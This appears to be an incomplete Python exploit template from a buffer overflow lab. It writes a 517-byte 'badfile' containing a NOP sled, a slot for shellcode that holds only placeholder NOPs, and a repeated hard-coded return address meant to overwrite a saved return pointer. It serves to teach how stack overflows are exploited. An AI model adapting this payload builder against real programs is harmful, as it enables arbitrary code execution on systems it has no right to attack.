#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"  
  "\x90\x90\x90\x90"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)  # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcef8 + 0x100 # Change this number 
           # Change this number 
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
for offset in range(0,239,4):
  content[offset:offset + L]       =(ret).to_bytes(L,byteorder='little') 
   
##################################################################



# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
